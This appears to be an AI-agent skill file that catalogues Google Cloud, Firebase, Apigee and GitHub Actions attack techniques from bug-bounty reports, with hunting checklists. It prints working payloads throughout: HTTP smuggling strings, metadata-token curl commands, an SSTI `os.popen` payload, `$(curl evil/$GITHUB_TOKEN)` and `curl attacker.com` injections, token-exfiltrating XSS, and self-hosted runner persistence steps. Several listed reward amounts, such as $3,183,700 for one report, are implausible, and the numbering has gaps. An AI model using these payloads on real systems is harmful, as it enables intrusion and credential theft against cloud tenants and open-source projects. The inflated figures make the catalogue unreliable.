---
name: google-vrp-cloud
description: 'Google Cloud VRP / OSS VRP techniques. GCP LB/CDN HTTP parser quirks (bare CR, NBSP, chunk-ext) for cache poisoning + Cloud Armor bypass; GitHub Actions pwn requests (pull_request_target + fork checkout, pom.xml injection, self-hosted runner takeover); GCS bucket squatting (ADC auto-create); GKE Workload Identity Federation downgrade; Zip Slip RCE (SecOps SOAR, Web Designer DLL hijack); Firebase SDK SA key via JSON.stringify; AMP/Uptime Check SSRF to GCP metadata; Apigee sandbox escapes (Rhino ClassShutter, LookupCache RCE); Composer/Airflow secret_key + env-var RCE; Cloud Shell root takeover. Checklists: GCP LB, GitHub Actions on Google orgs, SA token hunting, Cloud Shell/IDX, Apigee, debug endpoints (/procz /flagz). Source: 202 public HoF reports. Spanish triggers — "gcp", "cloud vrp", "cloud shell", "gke", "apigee", "firebase backend", "bucket squatting", "github actions google", "oss vrp", "cloud run", "cloud armor", "infraestructura google".'
---

# Google VRP — Cloud / GCP / Firebase / CI-CD Techniques

Subset of 202-report public Hall-of-Fame. Focus: GCP infrastructure, Cloud VRP, Firebase, Apigee, GitHub Actions / OSS VRP, Cloud Shell/IDX.
Use alongside `google-vrp-web` and `google-vrp-android`.

---

## Recurring patterns (cloud domain)

1. **GCP load balancer / CDN HTTP parser quirks** — bare CR after method, extra spaces after URI, non-ASCII chars in header names (\xa0, \x85), bare CR in chunk-ext BWS. Combine with quirky origin servers (Lighttpd, Tornado, FastHTTP, Node.js, Gunicorn<22) for cache poisoning or Cloud Armor bypass via request smuggling.
2. **GitHub Actions "pwn request"** — `pull_request_target` + fork SHA checkout without `persist-credentials: false` + non-ephemeral self-hosted runners. Auto-label bots trigger label-gated workflows. Inject via pom.xml (Maven exec plugin), `MESSAGE` env interpolation, composite action inputs (`issue-title`, `issue-body`, `main_repo`).
4. **Open Code-OSS / Theia / IDX** — `webWorkerExtensionHostIframe.html` on same origin as IDE. `parentOrigin` from query string + relayed `postMessage` → XSS → RCE. Also: filename injection in `launch.json`, debugger proxy running arbitrary JS, `_workstationAccessToken` Login-CSRF.
6. **GCS bucket squatting** — services auto-creating deterministic buckets (`${project_id}-us-central1-adc`, `motus-pilot.appspot.com`) without ownership check. Pre-claim → cross-tenant RCE via Terraform overwrite.
7. **GKE Workload Identity downgrade** — relabel nodes: `iam.gke.io/gke-metadata-server-enabled=false` + `cloud.google.com/metadata-proxy-ready=true` → recover host SA `cloud-platform` token from metadata. Not exploitable on Autopilot.
8. **Zip Slip → RCE** — no traversal check on zip entry names; overwrite script the server executes (`rasterize.js` for phantomjs in SecOps SOAR; DLL hijack on Web Designer Windows).
9. **GAR yum/dnf plugin URL validation** — `'pkg.dev' in url` matches `attacker.com/mirror?=test-yum.pkg.dev/`. Fix: `urlparse.netloc.endswith('.pkg.dev')`.
11. **Firebase / Firestore SDK SA key leak** — `JSON.stringify` on Firestore objects exposes SA private key in `_settings`. `toJson` vs `toJSON` spelling causes regression (#168).
12. **Firebase config `apiKey` open signup** — `identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>` → `idToken` (often `email_verified=false`) → bypass management APIs.
13. **Internal Google debug endpoints** — `/labelaclz`, `/flagz`, `/procz?file=`, `/varz`, `/statusz`, `/streamz`, `/reportcardz`, `/java/procz`. LFI as root, leak API keys, SA emails, BNS addresses.
14. **AMP / preview / validator SSRF** — `169.254.169.254/?recursive=true&alt=text` with `Metadata-Flavor: Google`. Use attacker-server redirect chain to bypass IP filters.
24. **GitHub-token leak via `actions/checkout`** — `find $HOME/work -type f -name config | xargs cat` extracts token from local git config. Add `persist-credentials: false`.
25. **Auto-label bots as pwn-request triggers** — `auto-label` on PR title → `pull_request_target: types: [labeled]` fires on attacker code.
27. **JWT / Firebase ID token without `email_verified`** — register `jdoe@google.com`, get `idToken`, hit management API.
28. **Composer / Airflow `secret_key="some-random-id"`** + `PYTHONWARNINGS` / `BROWSER` env vars executed on every Python spawn → reverse shells on all 4 Composer machines.
29. **CEF debugger open** — `--remote-debugging-port` on Electron-style apps (Web Designer, IDX) → local connect for file/SDK access.

---

## Per-report catalog

### #2 — $3,183,700 — Ezequiel Pereira — Cloud DM RCE
Type Provider in Deployment Manager with `descriptorUrl` pointing at internal blade target and `inputMappings.value: $.googleOauth2AccessToken()` — attaches Google OAuth Bearer to outbound requests, response returned in `selfLink`. Use `gslbTarget=blade:apphosting-admin-nightly`, `credentialType:GAIAMINT`, `transport:GSLB`.

### #3 — $3,133,700 — Divyanshu — OSS VRP — magic-modules CI access tokens
Malicious PR against `GoogleCloudPlatform/magic-modules`; CI minted GCP access tokens written to a file accessible from workflow context. Valid across `ci-gke-*`, `ci-bq-*`, `ci-gsuite-sa-project` (contains `gsuite-sa.json`), `graphite-docker-images`.

### #8 — $1,600,000 — Jakub Domeracki — Cloud VRP — SecOps SOAR Zip Slip → RCE
`Compressor.UnzipFilesToFolder()` uses `Path.Combine(directoryName, item2.Entry.Name)` without traversal check. Entry named `/opt/siemplify/siemplify_server/bin/ChartsJs/rasterize.js` overwrites the phantomjs script → RCE → exfiltrate K8s pod env, default SA token, Cloud Secret Manager secrets including `FirebaseRemoteConfigServiceAccountProd` from `siem-firebase-prod`.

### #11 — $1,500,000 — OSS VRP — CDAP/Data Fusion GitHub Actions pwn requests
~22 repos in `data-integrations` / `cdapio` orgs use `workflow_run` triggered by "Trigger build" workflow + `actions/checkout@v3` with `${{ github.event.workflow_run.head_sha }}`. Submit draft PR with workflow named "Trigger build"; parent `build.yml` builds untrusted Maven `pom.xml` (use `maven-exec-plugin` to exfiltrate `GH_TOKEN` from `.git/config`). Non-ephemeral `k8s-runner-build` → runner persistence.

### #13 — $1,333,700 — Jakub Domeracki — Cloud VRP — ADC bucket squatting
Application Design Center auto-creates `${project_id}-us-central1-adc` on first enable without ownership check. Pre-claim + `roles/storage.admin` for `allUsers`. P4SA `service-${project_number}@gcp-sa-designcenter.iam.gserviceaccount.com` writes Terraform files into attacker bucket → leak secrets + overwrite IaC for RCE.

### #14 — $1,333,700 — OSS VRP — Bazel `cherry_picker` action injection
`bazelbuild/continuous-integration/actions/cherry_picker/action.yml` interpolates `${{ inputs.issue-title }}` / `${{ inputs.issue-body }}` directly inside `run:`. Any GitHub user opens issue with title `$(curl evil/$GITHUB_TOKEN)` to inject into composing workflows (bazel/bazel uses this).

### #15 — $1,333,700 — Praetorian — OSS VRP — TensorFlow self-hosted runner takeover
Default GH: workflows from prior contributors skip approval. ARM64 non-ephemeral self-hosted runners. Submit tiny merged PR → become "contributor" → PR workflow `runs-on: [self-hosted, linux, ARM64]` installing a private runner via `nohup ./run.sh &` with `RUNNER_TRACKING_ID=0` to detach. Uses GitHub as C2. Steals `GCP_CREDS`, `AWS_PYPI_ACCOUNT_TOKEN`, `JENKINS_TOKEN`, `DOCKERHUB_TOKEN`.

### #27 — $600,000 — Ben Kallus — GCP Classic App LB request smuggling to Node.js
`POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n2\r\r;a\r\n02\r\n38\r\n0\r\n\r\nGET /bad_path/`. LB allows bare CR inside chunk-ext BWS; Node parses `\r\r` like `\r\n` → smuggled GET `/bad_path/` bypasses Cloud Armor.

### #28 — $500,000 — Jakub Domeracki — Cloud VRP — GKE WIF downgrade attack
`kubectl label nodes $N iam.gke.io/gke-metadata-server-enabled=false --overwrite` + `cloud.google.com/metadata-proxy-ready=true` re-enables Metadata Concealment. `curl http://metadata.google.internal/.../token` with `Metadata-Flavor: Google` returns node SA token (often `cloud-platform`). Not exploitable on Autopilot.

### #30 — $500,000 — Ben Kallus — GCP Classic App LB header-name `\xa0` smuggling
LB forwards non-ASCII bytes in header names; Gunicorn<22 `str.strip` (Unicode-aware) treats `Transfer-Encoding\xa0:` as `Transfer-Encoding:` → bypass Cloud Armor, poison CDN.

### #31 — $500,000 — `xoogler-payday` GCS bucket enumerable
`storage.googleapis.com/xoogler-payday/` listing accessible; password-protected zips downloadable and brute-forceable.

### #32 — $500,000 — Kavindu Pasan — Cloud Cheatsheet XSS
Frontend-only sanitization; POST to Cloud Function `add_architecture` with `link: "javascript://%0aalert(document.domain)"` stores payload running on `googlecloudcheatsheet.withgoogle.com`.

### #33 — $500,000 — Ben Kallus — GCP Classic App LB + CDN cache poisoning via bare CR after method
`GET\r /index.html HTTP/1.1` forwarded; Tornado/Lighttpd/CherryPy treat `GET\r` as distinct method (501) but CDN caches under `/`. Subsequent legitimate `GET /` returns cached 501.

### #34 — $500,000 — Ben Kallus — Cloud CDN bare CR in header values
`Test-Header: X\rX\r\n\r\n` forwarded unchanged; usable for cache poisoning / ACL bypass with origin servers that misinterpret bare CR.

### #37 — $500,000 — Google Public DNS DNSSEC cache pollution
Modifying RRSIG with non-matching key tag returns insecure answer (no AD bit) instead of SERVFAIL → cache pollution of DNSSEC-signed domains.

### #42 — $500,000 — Omar Espino — Google Cloud Shell instance takeover (root)
`<style onload>` XSS in .md preview → LFI `?uri=file://` → container escape `../id_cloudshell` → SSH root to `devshell-vm-XXXX.cloudshell.dev:6000`. Delivered via GitHub "Open in Cloud Shell" button.

### #43 — $500,000 — wtm (offensi) — Cloud Shell `go_get_repo` RCE
Undocumented `?go_get_repo=go.offensi.com/go.html` invokes `go get`; serve `<meta name="go-import" content="… hg https://attacker/hgrepo/root">` to load Mercurial repo exploiting CVE-2019-3902 → drop malicious `cut` binary executed by `cloudshell_open`.

### #48 — $500,000 — GCR delete via GKE node with read-only `devstorage` scope
`gcloud container images delete` from GKE pod with `devstorage.read_only` succeeds via `projectEditor` legacy bucket binding that overrides the node scope.

### #57 — $313,370 — NDevTK — IDX insecure debugger proxy
`https://8282-monospace-<ID>.cloudworkstations.dev/proxy?url=` runs arbitrary JS; registers service worker capturing `_workstation/login?redirect=<secret>` URL → mint `WorkstationJwt` cookie for any port subdomain.

### #61 — $313,370 — Mohamed Mahmoudi — GCP Backend Bucket misrouting
LB concatenates path-before-`/` with bucket name: `GET -pwn/index.html` to LB with bucket `vellum-sc-backend-bucket-for-protection` → GCS request `GET vellum-…-protection-pwn/index.html`. Pre-claim `<bucket>-pwn` for response forgery. 5000+ LBs vulnerable.

### #73 — $313,370 — Jinseo Kim — Kaggle Kernel metadata SSRF
`curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token` from any Kaggle kernel returns broad-scope token.

### #74 — $313,370 — Jafar Abu Nada — `peering.google.com` LFI
`/static/images/couch-ipad.png../../../../../../../etc/passwd` reads files; leaks `apihost_address=169.254.169.253:4`.

### #77 — $233,700 — Jinseo Kim — Caja playground SSRF
`https://caja.appspot.com/#http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` returns `cloud-platform` scoped access token.

### #80 — $150,000 — Basavaraj Banakar — AppSheet Apigee SSRF
`OpenAPI Spec URL` fetched server-side; `http://169.254.169.254` returns metadata folder index.

### #82 — $133,700 — Ben Kallus — GCP LB extra-spaces cache poisoning
`GET /      HTTP/1.1` forwarded; CDN caches under `/`, Lighttpd<1.4.77/FastHTTP return 404 → cached 404 poisons `/`.

### #83 — $133,700 — Jakub Domeracki — Firebase idToken without `email_verified`
`identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSy…` registers `jdoe@google.com` with `email_verified=false`; JWT accepted by `partner-companion.cloud.google/api/feedback-list` and other admin endpoints.

### #84 — $133,700 — `knowyourdata-tfds.withgoogle.com` LFI
`/assets/onboarding//..%2f..%2f..%2f..%2f..%2f..%2f__init__.py` reads source.

### #85 — $133,700 — Apigee Rhino ClassShutter sandbox bypass
JavaCallout instantiates object with `run()` payload in a flow variable; JavaScript policy retrieves and calls `run()` — different policy security models share state.

### #86 — $133,700 — Apigee header injection via positional set
`context.setVariable("request.header.customHeader.1", "value\r\nInjectedHeader: x")` — newline filter only applies to name-based setting, not positional index.

### #87 — $133,700 — Apigee LookupCache `postDeserialize()` RCE
Cache entry implementing `com.apigee.util.PostDeserializer` runs `postDeserialize()` outside Java Permissions. Populate via PopulateCache → retrieve via LookupCache → arbitrary Java RCE.

### #97 — $50,000 — Open Chronograf InfluxDB on `216.73.89.76:8083`
Admin panel accessible without login at `/sources/1/status`.

### #98 — $50,000 — OSS-Fuzz `pr_helper.yml` JS injection
PR creates `projects/new-project/whatever/project.yaml` with `main_repo` containing `require('child_process').execSync(atob('...'))`. Python writes it to `MESSAGE` env var; JS step interpolates → RCE. `pull-requests: write` token forges `Ready to merge` label.

### #99 — $50,000 — Firestore Node SDK SA key via JSON.stringify
All Firestore objects reference `_settings` containing the SA private key; default `JSON.stringify` exposes it. See #168 for `toJson`/`toJSON` regression.

### #102 — $50,000 — Cloud Tools for Eclipse OAuth chain
`redirect_uri=http://localhost:8080/_ah/login?continue=http://attacker.com` — App Engine local server `_ah/login` is an open redirect; OAuth code leaks via Referer.

### #103 — $50,000 — Cloud Tools for Eclipse XXE
Opens `appengine-web.xml` with default XML parser; external DTD `<!ENTITY % file "file:///etc/passwd">` exfiltrates files.

### #104 — $50,000 — HPC Toolkit nginx alias traversal
`location /static { alias …/static/; }` (no trailing `/` on location); `/static../website/settings.py` reads source.

### #109 — $50,000 — Firebase Dynamic Links cross-tenant
APK's `google_crash_reporting_api_key` + `X-Android-Package` + `X-Android-Cert` → `firebasedynamiclinks.googleapis.com/v1/shortLinks` → mint links under any `*.page.link` of other apps.

### #110 — $50,000 — AppSheet Apigee SSRF redirect bypass
Blocked-localhost filter bypassed via attacker `302.php?url=http://localhost:20202` (Fluent Bit prometheus exporter exposed).

### #115 — $50,000 — `motus.area120.com` Firebase Storage list
Any signed-in user lists `firebasestorage.googleapis.com/v0/b/motus-pilot.appspot.com/o/` → downloads Firestore/Datastore exports with user data and Stripe IDs.

### #123 — $20,000 — `partner-companion.cloud.google` Stored XSS
Unauth POST `/api/notifications`; `link` field → `window.open()`. Use `javascript://%0aeval(atob('…'))` to exfiltrate `gpau_id` Firebase OIDC token from `localStorage`.

### #126 — $10,100 — `gmail-oauth2-tools/oauth2.py` SSL not validated
`imaplib.IMAP4_SSL` / `smtplib.starttls()` without explicit SSL context skips cert verification → MITM captures XOAUTH2 tokens.

### #127 — $10,100 — Cloud Tools for Eclipse Login CSRF
Missing `state` param; local HTTP callback accepts attacker `code` → IDE deploys to attacker GCP project.

### #129 — $10,000 — `alloydb-java-connector` CI GITHUB_TOKEN leak
`pull_request_target` + auto-label on PR title; `actions/checkout` without `persist-credentials: false`; PR-supplied `.kokoro/build.sh` exfiltrates token.

### #135 — $10,000 — Google Drive macOS installer LPE
Postinstall `chmod u+s` without symlink check; race-replace binary with symlink to `/opt/local/bin/fish` → setuid root shell.

## $0 reports (summary)
- **#149** Firebase Storage takeover — public `apiKey` → `accounts:signUp` → overwrite `io-photobooth-20667.appspot.com`.
- **#150** kernelCTF: net/xfrm UAF (Linux ≤6.16.9) via SPI=0 `xfrm_state_update` lookup after free.
- **#151** YouTube Studio Closure `goog.loadModuleFromSource_` RCE — `COMPILED=false` on prod, exfiltrates SID/SAPISID.
- **#152** Guava `maven-bundle-plugin` 5.1.8 (CVE-2021-42036) in pom.xml — supply chain.
- **#153** Civetweb DoS: SSI infinite inclusion + heap BOF in 301-redirect path.
- **#155** LangGraph quickstart path traversal `app/{path:path}` → `/etc/shadow`, `.env`.
- **#156** `pages.mandiant.com/version` exposes service versions + commit hashes.
- **#157** GAR yum/dnf plugin: `'pkg.dev' in url` matches attacker domain → receives SA Bearer token.
- **#162** IDX shared-workspace session persists after access removal.
- **#164** Google leaking 60+ IXP LAN segments to GCP customers via BGP.
- **#165** GCP Composer env-var RCE: `PYTHONWARNINGS` + `BROWSER` → reverse shell on all 4 Composer machines.
- **#168** Firestore SDK `toJson` vs `toJSON` regression closing #99.
- **#169** Drive macOS TCC bypass via child injection: `--debugger_command iTerm2` inherits Drive's photos entitlement.

---

## Recent additions (2023–2025, from public writeups)

### GKE Autopilot container escape
GKE Autopilot (unlike Standard) doesn't expose node-level access, but misconfigured workloads with `NET_RAW` or `hostPath` mounts can still escape. Confirmed: Autopilot does NOT allow the WIF label-relabeling attack from #28 — requires a different primitive (privileged container or node-pool misconfiguration).

### Cloud Workstations SSH key injection + auth bypass
Cloud Workstations stores SSH public keys in instance metadata (`ssh-keys` attribute). A user with `compute.instances.setMetadata` on the workstation project can inject their own key and SSH in as any user running in the workstation. Auth bypass: `_workstationAccessToken` is a Login-CSRF GET parameter — an XSS on any same-origin workstation subdomain can mint a valid JWT for the target port.

### API Gateway JWT bypass via `x-http-method-override`
GCP API Gateway passes `x-http-method-override` header to backends. Setting it to `GET` on a `POST` request can bypass method-level JWT audience checks if the backend honors the override before the gateway validates the audience claim.

### Dataflow JMX unauthenticated RCE
Apache Beam Dataflow workers (Java runtime) expose JMX on `0.0.0.0:7199` by default in some pipeline configs. Any tenant with network access to the worker subnet can connect and execute arbitrary MBeans (`java.lang.Runtime.exec`). Escalate via the Dataflow worker SA token from instance metadata.

### ConfusedFunction — GCP Cloud Functions privilege escalation
`cloudfunctions.functions.create` / `update` implicitly grants the right to set the function's service account. By deploying a Cloud Function with a high-privilege SA from the same project (even one owned by another team), you impersonate that SA and inherit all its roles. Google partially fixed by requiring `iam.serviceAccounts.actAs` on the target SA, but many internal SA-to-function bindings remain overly broad.

### Google Flank — GitHub Actions pwn request (OSS VRP)
`github.com/Flank/flank` used `pull_request_target` with `actions/checkout` of the PR head SHA and non-ephemeral GHA runners. A PR with a malicious `build.gradle` triggers `./gradlew assemble` → Gradle plugin executes arbitrary Kotlin → exfiltrates `GCLOUD_KEY`, `FIREBASE_TOKEN`, etc. from the runner env.

### Release-Drafter supply chain compromise (OSS VRP)
`release-drafter/release-drafter` GitHub Action pinned by digest in dozens of Google repos, but `release-drafter.yml` config files accepted from PRs in `pull_request_target` workflows. An attacker PR can override `template:` with `${{ env.GITHUB_TOKEN }}` or similar interpolation paths.

### TE.0 HTTP request smuggling on GCP LBs
GCP Classic App LB forwards `Transfer-Encoding: identity` (TE.0) unchanged. Some backends (older Envoy, Jetty 9) interpret TE.0 as "no transfer encoding" and fall back to `Content-Length`, enabling CL.TE desync when both headers are present. Different from the bare-CR chunk-ext attack (#27): TE.0 uses standard ASCII.

### Looker RCE via git fsmonitor hook
Looker (looker.google.com) internal Git integration runs `git fetch` in the Looker process. A repo with `.git/hooks/fsmonitor-watchman` or a `.gitconfig` `core.fsmonitor` setting executes a shell script on `git status`. Deliver via a malicious Looker project import → RCE as the Looker service user → access to internal DB creds and Looker SA token.

### Looker Studio cross-tenant SQLi
Looker Studio (datastudio.google.com) "Community Connector" datasources pass user-supplied parameters to backend BigQuery or Cloud SQL queries. A connector configured with string interpolation rather than parameterized queries accepts `'UNION SELECT email FROM users--` payloads. Cross-tenant: one workspace's connector can be set as a data source by another workspace if sharing is enabled without scoping.

### GCE VM takeover via DHCP flood
A GCE VM on a shared VPC whose DHCP lease renewal is handled by `dhclient` without `--server-id` filtering can be hijacked by an attacker VM in the same subnet. Flood with crafted DHCPOFFER → victim renews with attacker IP as gateway → MITM all egress including metadata token requests.

### Vertex AI command injection
Vertex AI Workbench notebooks (JupyterLab on managed instances) expose the `Launcher` API without additional auth when a user is already authenticated. `POST /api/kernels` with `name=python3&cmd=curl+attacker.com` injects shell args on kernels spawned with the Workbench SA token. Also: Vertex AI Pipeline steps that interpolate user-supplied `display_name` into shell execution without escaping.

### GCP Org Policy bypass via metadata label manipulation
GCP Org Policies enforced via `compute.restrictCloudArmor` or similar resource-attribute constraints check labels at creation time. Attacker creates resource without the disallowed label, then applies it after creation — policy not re-evaluated on update. Allows disabling Cloud Armor, enabling external IP, or changing region constraints retroactively.

### SecOps SOAR SSTI + JWT chain
Chronicle SecOps (formerly Siemplify) SOAR has a Jinja2 template rendering endpoint at `/api/v1/widgets/custom`. The `template` parameter is rendered server-side without sandboxing: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. Combine with a forged JWT (weak `secret_key` from docker-compose defaults) to authenticate without credentials.

### SA impersonation chain via `iam.serviceAccounts.getOpenIdConnect`
If a SA has `iam.serviceAccounts.getOpenIdConnect` on itself (often granted via `roles/iam.serviceAccountTokenCreator`), it can mint OpenID Connect tokens for any audience including internal APIs. Chain: low-priv user → any SA with `token.create` → `generateIdToken` → authenticate to any API accepting Google OIDC (Cloud Run, GKE IAP, Cloud Functions URL).

### StubZero — Cloud Application Integration RCE ($148,337) — CVE-2026-2031 — brutecat

**Affected service:** `cloudcrmipfrontend-pa.clients6.google.com` (Google Cloud Application Integration)

**Reward:** $60k (first RCE) + $75k (second RCE chain) + $13,337 (GetIntegrationVersion RPC) = $148,337

#### Phase 1 — Proto definition leak + arbitrary Stubby RPC execution

1. **Proto schema leak** — `GET /v1/integrationPlatform:getProtoDefinition?fullName=<fully.qualified.MessageName>&isEnum=false` returned internal protobuf definitions from the google3 monorepo. No access control scoping: any message in Google's codebase was queryable. Used to reverse-engineer internal API structures.

2. **Queue info disclosure + client_id extraction** — `GET /v1/integrationPlatform:listQuotaQueue` with filter `client_id>"123"` leaked internal workflow execution queues including `client_id: "default"` (required for subsequent workflow creation). Added `?alt=proto` + header `X-Goog-Encode-Response-If-Executable: base64` to bypass browser content-type restrictions on binary proto responses.

3. **Workflow creation** — `POST /v1/integrationPlatform:createDraftWorkflow` with `clientId: "default"` (leaked above). Discovery document referenced `GenericStubbyTypedTask` inside `RPC_TYPED` module config, hinting at arbitrary RPC capability.

4. **ACL publish bypass** — `setAcl` endpoint required the creator not to be an editor (creator-editor separation). Bypass: two attacker accounts — first account sets `role: 105` for both, second account completes publication. No server-side enforcement of the creator-editor constraint.

5. **RCE via `GenericStubbyTypedTaskV2`** — workflow task config:
   ```json
   { "serverSpec": "gslb:alkali-base", "serviceName": "ServerStatus", "serviceMethod": "GetServices" }
   ```
   Executing the workflow invoked `/ServerStatus.GetServices` as the **cloudcrmipfrontend production service identity** → arbitrary Stubby RPC limited only by the service's `RpcSecurityPolicy` allowlist.

#### Phase 2 — Cross-tenant IDOR + public API accepts internal task types

1. **Version UUID IDOR** — `GET /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/<uuid>`: auth checked project ownership but not whether the version UUID belonged to that project → read any integration from any GCP project.

2. **ListTestCases without project scope** — `POST /$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases` without filter field 2 (`workflow_id = ...`) returned test cases across all GCP projects. Response included `@google.com` creator emails confirming internal team integrations.

3. **UUID binary search** — filter comparison operators (`>`, `<=`) on UUIDs enabled binary search reconstruction of victim workflow UUIDs: ~128 requests per 32-char UUID.
   ```
   id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"
   ```

4. **Internal tasks in public API** — public Application Integration API accepted `taskConfigsInternal` + `taskUiModuleConfigs` with `moduleId: "RPC_TYPED"`. Test case execution triggered deeper backend paths, producing stack traces revealing `ExecuteStubbyCallRequest` construction:
   ```
   com.google.net.rpc3.client.RpcClientException:
   <eye3 title='/EventbusStubbyCallerService.ExecuteStubbyCall, UNAUTHENTICATED'/>
   ```

**Auth context:** First-party SAPISIDHASH (`Authorization: SAPISIDHASH <hash>`) + Cookie, domain-restricted to `https://console.cloud.google.com`.

**Checklist additions from this finding:**
- Any GCP service with `getProtoDefinition`-style introspection endpoints — check access control scoping.
- Workflow/pipeline systems: look for `GenericStubbyTask`, `RPC_TYPED`, or any task type that references an internal RPC framework.
- Multi-step publish/approval flows: bypass by manipulating ACLs with two accounts before publishing.
- Filter parameters on list endpoints: test comparison operators (`>`, `<`, `<=`, `>=`) for oracle-based UUID enumeration.
- Internal task type gating: test whether `*Internal` fields in task configs are accepted by public API variants.

---

### Dataprep / Actifio JAR swapping RCE
Google Dataprep (Trifacta-based) and Actifio backup agents download plugin JARs from GCS paths configured in `application.properties`. If the GCS bucket is misconfigured (`allUsers: storage.objectCreator`) or the service writes to a predictable path, an attacker swaps the JAR with a malicious one executed on next agent restart. Affected SA often has broad project-level roles.

---

## Checklists

### GCP Classic App LB:
- bare CR after method (`GET\r /`) — cache poisoning to Lighttpd/Tornado/CherryPy/libsoup/libevent.
- bare CR in chunk-ext BWS (`2\r\r;a\r\n`) — request smuggling to Node.js.
- non-ASCII bytes in header names (`\xa0`, `\x85`) — smuggling to Gunicorn<22.
- multiple SP after URI (`GET /     HTTP/1.1`) — cache poisoning to Lighttpd<1.4.77 / FastHTTP.
- bare CR in arbitrary header values forwarded to backend.

### GitHub Actions on Google orgs:
- `pull_request_target` without label gating, or label gating via `auto-label` bot on PR title/body.
- `workflow_run` triggered by attacker-named workflow.
- `actions/checkout` without `persist-credentials: false`.
- `${{ github.event.X.title|body|main_repo }}` interpolated inside `run:` or `env:`.
- composite actions interpolating user inputs (`issue-title`, `issue-body`).
- non-ephemeral self-hosted runners (cleanup steps, persistent home dir).
- Maven `pom.xml` with `exec-maven-plugin` reachable from PR-supplied build.
- `id-token: write`, `pull-requests: write`, `issues: write` as dangerous repo-default permissions.

### GCP services with SA tokens:
- creds in `.git/config`, env vars, or instance metadata (IDE/Cloud-Shell-style products).
- yum/dnf/apt plugins with weak URL validation (`'pkg.dev' in url`).
- `container.nodes.update` permission on GKE clusters (WIF downgrade).
- Composer/Airflow envs accepting user-set `BROWSER`, `PYTHONWARNINGS`.
- deterministic buckets (`${project}-{region}-{service}`) auto-created without ownership check.

### Cloud Shell / IDX / Cloud Workstations:
- preview/extension-host iframes on same origin as IDE.
- `parentOrigin` from query string accepted as postMessage trust.
- filename injection in launch.json or debugger UI.
- debugger proxies that fetch arbitrary URLs.
- Login-CSRF via `_workstationAccessToken` GET param.

### Internal Google IPs (ASN 15169):
- `/labelaclz`, `/flagz`, `/procz?file=`, `/varz`, `/statusz`, `/streamz`, `/reportcardz`, `/java/*` variants.
- `Default LabelACL Policy: OPEN`, `mdb/<group>` ACLs.
- BNS addresses, `gws-prod`, SA emails in environ.

### Apigee:
- JavaCallout → JavaScript inter-policy state for ClassShutter escape.
- LookupCache `postDeserialize()` Java RCE.
- Hosted Targets Node.js running as root.
- Positional header set `request.header.foo.1` bypasses newline filter.

### New GCP attack surfaces (2023–2025):
- GKE Autopilot: no label-relabeling, but check `NET_RAW`, `hostPath`, privileged PSA misconfigs.
- Vertex AI Workbench: JupyterLab `/api/kernels` command injection; Pipeline step `display_name` interpolation.
- Looker: Git integration fsmonitor hook RCE; Community Connector SQLi (Looker Studio).
- API Gateway: `x-http-method-override` JWT audience bypass.
- Dataflow: JMX on `0.0.0.0:7199` in Java workers → MBean RCE.
- GCP Org Policy: resource-attribute constraints not re-evaluated on label updates after creation.
- ConfusedFunction: `cloudfunctions.functions.create` + target SA without `iam.serviceAccounts.actAs` requirement.
- OIDC chain: `generateIdToken` with forged audience → Cloud Run / IAP auth bypass.
- GCS JAR swap (Dataprep/Actifio): predictable plugin path + bucket misconfiguration.
- TE.0 smuggling: `Transfer-Encoding: identity` + `Content-Length` desync on Envoy/Jetty 9 backends behind GCP LBs.

### Stubby / internal RPC surfaces (Application Integration pattern):
- Endpoints named `getProtoDefinition`, `getSchema`, `describeService` — check if they expose internal google3 message types without access scoping.
- `listQuota*`, `listQueue*`, `listExecution*` with filter params — test comparison operators (`>`, `<=`) for binary-search oracle on UUIDs/IDs.
- Workflow/pipeline task configs accepting `GenericStubbyTask`, `RPC_TYPED`, or `moduleId` referencing internal RPC modules.
- Multi-account ACL bypass: creator-editor separation enforced only on the creator's account — test with a second account calling `setAcl` then `publish`.
- Public API variants of internal services: send `taskConfigsInternal`, `*Internal`, or `*Configs` fields and observe if the backend parses them.
- Error messages / stack traces revealing `ExecuteStubbyCall`, `RpcClientException`, or `eye3` titles — indicate backend RPC construction reachable from user input.
- `?alt=proto` + `X-Goog-Encode-Response-If-Executable: base64` to retrieve binary proto responses from endpoints that return `application/octet-stream`.
